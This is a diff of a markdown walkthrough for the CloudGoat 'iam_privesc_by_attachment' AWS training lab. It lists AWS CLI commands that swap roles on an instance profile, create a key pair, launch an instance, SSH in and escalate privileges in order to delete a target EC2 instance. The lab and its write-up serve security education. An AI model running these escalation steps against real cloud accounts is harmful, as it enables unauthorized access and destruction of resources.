@@ -110,11 +110,11 @@ Type `dd` beside each line to be removed
 Then `:wq` to write and quit  
 
 ## iam_privesc_by_attachment
-**Scenario Goal: Delete the EC2 instance "cg-super-critical-security-server."**
+**Scenario Goal: Delete the EC2 Instance "cg-super-critical-security-server."**
 1. Create scenario  
 `./cloudgoat.py create iam_privesc_by_attachment --profile goat`  
 2. Document all Outputs information  
-3. Create user profile
+3. Create user profile   
 `aws configure --profile kerrigan`   
     * AWS Access Key ID: __kerrigan account aws_access_key_id__   
     * AWS Secret Access Key: __kerrigan aws_secret_access_key__   
@@ -134,26 +134,26 @@ Two of these instance profiles appear to contain AWS access key IDs different th
 8. Enumerate roles  
 `aws iam list-roles --profile kerrigan`  
 Most of the roles listed grant access to services other than EC2 (RDS, trustedAdvisor, support, etc).  
-Look at the profiles and comparing them to the roles. There is a meek profile and role, but no mighty role. Let's fix that!  
+Look at the profiles and comparing them to the roles. There is a meek profile and role, but no mighty role. How mighty is this role?    
 9. Remove the meek role from the meek profile   
 `aws iam remove-role-from-instance-profile --instance-profile-name cg-ec2-meek-instance-profile-x --role-name cg-ec2-meek-role-x --profile kerrigan`  
 10. Add the mighty role to the meek profile   
 `aws iam add-role-to-instance-profile --instance-profile-name cg-ec2-meek-instance-profile-x --role-name cg-ec2-mighty-role-x --profile kerrigan`  
 This change elevates privileges, but not enough to terminate the target.   
-However, now we can deploy our own instance. 1st lets find more information about our target. Then we'll create a new EC2 pair to create the instance with and grant us shell access to the new image.  
-11. What subnet is the target connected to?  
+However, now we can deploy our own instance. 1st find more information about our target. Then create a new EC2 pair to create the instance with and grant shell access to the new image.  
+11. What subnet is the target connected to?   
 `aws ec2 describe-subnets --subnet-id <targetSubnetID> --profile kerrigan`   
 It's tagged as public subnet, that's convenient.   
 12. What Security Groups are associated with the target?  
 Further inspection if the Group Names are to be believed, one is for http, and the other is for ssh access
 13. Create new EC2 key pair and save it as a .pem file for ssh use   
 `aws ec2 create-key-pair --key-name mighty --query 'KeyMaterial' --output text | out-file -encoding ascii -filepath mighty.pem --profile kerrigan`  
-`chmod 400 mighty.pem`
-14. Create a new EC2 instance with the new keypair, and the subnet/security group IDs that are the same as the target instance
+`chmod 400 mighty.pem`   
+14. Create a new EC2 instance with the new keypair, and the subnet/security group IDs that are the same as the target instance   
 `aws ec2 run-instances --image-id <targetImageID> --instance-type t2.micro --iam-instance-profile Arn=<meekInstanceProfileARN> --key-name mighty --profile kerrigan --subnet-id <subnetID> --security-group-ids <securityGroupID>`
-15. Copy the new Instance ID and find it's public IP address 
+15. Copy the new Instance ID and find it's public IP address   
 `aws ec2 describe-instances --instance-id <newInstanceID> --profile kerrigan`
-16. SSH into the newly created instance
+16. SSH into the newly created instance    
 `ssh -i mighty.pem ubuntu@<publicDNSnameValue>`
 17. Install AWS CLI
 `sudo apt-get update && apt install awscli`
